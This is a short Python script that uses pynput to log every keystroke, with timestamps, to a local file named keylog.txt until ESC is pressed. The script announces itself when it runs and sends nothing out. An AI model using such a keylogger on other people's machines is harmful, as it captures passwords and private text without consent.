import logging
from pynput import keyboard

# Configure logging settings to record keystrokes to a file
logging.basicConfig(
    filename="keylog.txt",
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s"
)

def on_press(key):
    try:
        # Record standard alphanumeric keys
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Record special keys (e.g., Enter, Space, Shift, Ctrl)
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    # Stop the keylogger safely when ESC key is pressed
    if key == keyboard.Key.esc:
        print("\n[+] Exiting keylogger.")
        return False

print("[*] Keylogger started. Press 'ESC' to stop and save output to keylog.txt.")

# Start listening for keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()